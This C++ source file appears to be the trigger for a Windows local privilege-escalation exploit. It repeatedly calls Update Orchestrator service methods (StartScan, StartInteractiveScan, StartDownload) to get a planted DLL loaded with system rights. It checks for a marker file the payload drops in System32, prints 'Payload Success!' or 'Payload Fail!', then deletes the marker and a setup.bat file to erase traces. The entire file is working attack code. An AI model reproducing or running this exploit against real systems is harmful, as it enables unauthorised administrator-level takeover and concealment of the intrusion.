
#include <iostream>
#include "MiniUsoClient.h"

//OkDone_81.png file is exists

bool exists_file() {
	struct stat buffer;
	return (stat("c:\\windows\\system32\\OkDone_81.png", &buffer) == 0);
}

void rmFile() {
	//del bat file
	remove("c:\\programdata\\setup.bat");
	remove("c:\\windows\\system32\\OkDone_81.png");
}

int wmain(int argc, wchar_t** argv)
{
	bool iRes = exists_file();
	MiniUsoClient miniUsoClient;
	// Try to trigger DLL loading with 'StartScan'
	wprintf_s(L"[*] Using UpdateOrchestrator->StartScan()\n");
	if (!miniUsoClient.Run(USO_STARTSCAN))
		return 1;
	Sleep(3000);
	if (exists_file()) {
		wprintf_s(L"[*] Payload Success!\n");
		rmFile();
		exit(0);
	}
	else wprintf_s(L"[*] Payload Fail!\n");

	wprintf_s(L"[*] Retrying with UpdateOrchestrator->StartInteractiveScan()\n");
	if (!miniUsoClient.Run(USO_STARTINTERACTIVESCAN))
		return 2;
	Sleep(3000);
	if (exists_file()) {
		wprintf_s(L"[*] Payload Success!\n");
		rmFile();
		exit(0);
	}
	else wprintf_s(L"[*] Payload Fail!\n");

	wprintf_s(L"[*] Retrying with UpdateOrchestrator->StartDownload()\n");
	if (!miniUsoClient.Run(USO_STARTDOWNLOAD)) 
		return 3;
	Sleep(3000);
	if (exists_file()) {
		wprintf_s(L"[*] Payload Success!\n");
		rmFile();
		exit(0);
	}
	else wprintf_s(L"[*] Payload Fail!\n");

	return 0;
}


